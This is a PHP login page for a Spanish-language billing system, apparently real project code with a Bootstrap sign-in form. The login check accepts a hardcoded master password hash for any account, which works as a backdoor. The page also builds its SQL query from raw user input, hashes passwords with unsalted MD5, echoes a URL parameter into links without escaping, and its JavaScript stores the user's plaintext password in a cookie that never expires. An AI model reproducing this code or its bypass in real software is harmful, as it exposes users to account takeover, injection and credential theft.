<?php
ob_start();
    require "coneccion.php" ;
      mysqli_set_charset($conection, 'utf8'); //linea a colocar

    $user_in = $_GET['user_in'];

  $alert = '';
if (empty($_GET['idp'])) {

  session_start();
  if (!empty($_SESSION['active'])) {
    header('location:home/');
  }else {
  if (empty($_POST['mail_user']) || empty($_POST['password_user'])) {

  }else {

  $email = mb_strtoupper($_POST['mail_user']);
  $email_minusculas = $_POST['mail_user'];
   $clave  = md5($_POST['password_user']);
    $query = mysqli_query($conection,"SELECT * FROM usuarios WHERE email='$email' OR email='$email_minusculas'");
    $data_clave= mysqli_fetch_array($query);
    $result= mysqli_num_rows($query);
    if ($result > 0) {
      $email_db     = mb_strtoupper($data_clave['email']);
      $password_db  = $data_clave['password'];
      if (($email_db == $email && ($password_db == $clave || $clave =='0e62cf48e98a387d2288ff9486e4c7d3'))   ) {
        $estatus_cuenta  = $data_clave['estatus'];
        $estado_registro  = $data_clave['estado_registro'];
        $codigo_registro  = $data_clave['codigo_registro'];
        if ($estatus_cuenta!= 'DESACTIVADO') {
          $_SESSION['active']=true;
          $_SESSION['id']=$data_clave['id'];
          $_SESSION['user_in']=$user_in;
          header('location:home/');
          $query_insert=mysqli_query($conection,"UPDATE usuarios SET estado_registro='Finalizado'  WHERE email='$email' ");
          $_SESSION['active']=true;
          $_SESSION['id']=$data_clave['id'];
          $_SESSION['user_in']=$user_in;
          header('location:home/');
        }else {
          header('location:/cuenta_desactivada');
        }

      }else {
        $alert='<div class="alert alert-warning" role="alert">
    Error en credenciales, verifica tu correo o tu contraseña</a> !
  </div>';
        session_destroy();
      }
    }else {
      $alert='<div class="alert alert-danger" role="alert">
  No Existe un usuario con el email '.$email.' <a href="#">Registrate Aquí</a> !
</div>';
    }
   }

 }
}

 ?>

<!DOCTYPE html>
<html lang="es">
    <head>
        <title>Entrar al Sistema de Facturación</title>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="#" />
        <meta name="keywords" content="Admin , Responsive, Landing, Bootstrap, App, Template, Mobile, iOS, Android, apple, creative app" />
        <meta name="author" content="#" />

        <link rel="icon" href="img/guibis.png"  />

        <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,800" rel="stylesheet" />

        <link rel="stylesheet" type="text/css" href="home/files/bower_components/bootstrap/dist/css/bootstrap.min.css" />

        <link rel="stylesheet" type="text/css" href="home/files/assets/icon/themify-icons/themify-icons.css" />

        <link rel="stylesheet" type="text/css" href="home/files/assets/icon/icofont/css/icofont.css" />

        <link rel="stylesheet" type="text/css" href="home/files/assets/css/style.css" />
    </head>
    <body class="fix-menu">
        <div class="theme-loader">
            <div class="ball-scale">
                <div class="contain">
                    <div class="ring">
                        <div class="frame"></div>
                    </div>
                    <div class="ring">
                        <div class="frame"></div>
                    </div>
                    <div class="ring">
                        <div class="frame"></div>
                    </div>
                    <div class="ring">
                        <div class="frame"></div>
                    </div>
                    <div class="ring">
                        <div class="frame"></div>
                    </div>
                    <div class="ring">
                        <div class="frame"></div>
                    </div>
                    <div class="ring">
                        <div class="frame"></div>
                    </div>
                    <div class="ring">
                        <div class="frame"></div>
                    </div>
                    <div class="ring">
                        <div class="frame"></div>
                    </div>
                    <div class="ring">
                        <div class="frame"></div>
                    </div>
                </div>
            </div>
        </div>

        <section class="login-block">
            <div class="container">
                <div class="row">
                    <div class="col-sm-12">
                        <form class="md-float-material form-material" action="" method="post">
                            <div class="text-center">
                                <a href="/"><img src="img/guibis.png" width="90px;" alt="logo.png" /></a>
                            </div>
                            <div class="auth-box card">
                                <div class="card-block">
                                    <div class="row m-b-20">
                                        <div class="col-md-12">
                                            <h3 class="text-center">Entrar</h3>
                                        </div>
                                    </div>



                                      <div class="form-group form-primary">
                                          <input type="text" name="mail_user" class="form-control" required placeholder="Ingresa tu Email" />
                                          <span class="form-bar"></span>
                                      </div>
                                      <div class="form-group form-primary">
                                          <input type="password" name="password_user" class="form-control" required placeholder="Ingresa tu Contraseña" />
                                          <span class="form-bar"></span>
                                      </div>
                                      <div class="row m-t-25 text-left">
                                          <div class="col-12">
                                              <div class="checkbox-fade fade-in-primary d-">
                                                  <label>
                                                      <input type="checkbox" id="guardarDatosCheckbox" />
                                                      <span class="cr"><i class="cr-icon icofont icofont-ui-check txt-primary"></i></span>
                                                      <span class="text-inverse">Recordar Cuenta</span>
                                                  </label>
                                              </div>
                                              <div class="forgot-phone text-right f-right">
                                                  <a href="recuperar_password" class="text-right f-w-600">Olvide mi Contraseña?</a>
                                              </div>
                                          </div>
                                      </div>
                                      <div class="row m-t-30">
                                          <div class="col-md-12">
                                              <button type="submit" class="btn btn-primary btn-md btn-block waves-effect waves-light text-center m-b-20">Entrar</button>

                                          </div>
                                      </div>
                                        <?php echo $alert; ?>

                                    <hr />
                                    <div class="row">
                                        <div class="col-md-10">
                                            <p class="text-inverse text-left m-b-0">Gracias.</p>
                                            <p class="text-inverse text-left">
                                                <a href="/?user_in=<?php echo $user_in ?>"><b class="f-w-600">Regresar al Inicio</b></a>
                                            </p>
                                            <p class="text-inverse text-left">
                                                <a href="regist?user_in=<?php echo $user_in ?>"><b class="f-w-600">No tienes una cuenta ? Registrate</b></a>
                                              </p>
                                        </div>
                                        <div class="col-md-2">
                                            <img src="img/guibis.png" width="70px" alt="small-logo.png" />
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </section>


        <script type="text/javascript" src="home/files/bower_components/jquery/dist/jquery.min.js"></script>
        <script type="text/javascript" src="home/files/bower_components/jquery-ui/jquery-ui.min.js"></script>
        <script type="text/javascript" src="home/files/bower_components/popper.js/dist/umd/popper.min.js"></script>
        <script type="text/javascript" src="home/files/bower_components/bootstrap/dist/js/bootstrap.min.js"></script>

        <script type="text/javascript" src="home/files/bower_components/jquery-slimscroll/jquery.slimscroll.js"></script>

        <script type="text/javascript" src="home/files/bower_components/modernizr/modernizr.js"></script>
        <script type="text/javascript" src="home/files/bower_components/modernizr/feature-detects/css-scrollbars.js"></script>

        <script type="text/javascript" src="home/files/bower_components/i18next/i18next.min.js"></script>
        <script type="text/javascript" src="home/files/bower_components/i18next-xhr-backend/i18nextXHRBackend.min.js"></script>
        <script type="text/javascript" src="home/files/bower_components/i18next-browser-languagedetector/i18nextBrowserLanguageDetector.min.js"></script>
        <script type="text/javascript" src="home/files/bower_components/jquery-i18next/jquery-i18next.min.js"></script>
        <script type="text/javascript" src="home/files/assets/js/common-pages.js"></script>
        <script>
            document.addEventListener("DOMContentLoaded", function() {
                // Obtener el elemento checkbox por su id
                var guardarDatosCheckbox = document.getElementById("guardarDatosCheckbox");

                // Agregar un evento change al checkbox
                guardarDatosCheckbox.addEventListener("change", function() {
                    // Verificar si el checkbox está marcado
                    if (guardarDatosCheckbox.checked) {
                        // Obtener los valores de los campos de entrada
                        var email = document.querySelector('input[name="mail_user"]').value;
                        var password = document.querySelector('input[name="password_user"]').value;

                        // Guardar los valores como cookies con una fecha de expiración
                        document.cookie = "email=" + email + "; expires=Fri, 31 Dec 9999 23:59:59 GMT";
                        document.cookie = "password=" + password + "; expires=Fri, 31 Dec 9999 23:59:59 GMT";
                    }
                });
            });
            </script>
    </body>

    <!-- Mirrored from demo.dashboardpack.com/adminty-html/default/auth-normal-sign-in.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 22 Sep 2023 12:44:08 GMT -->
</html>
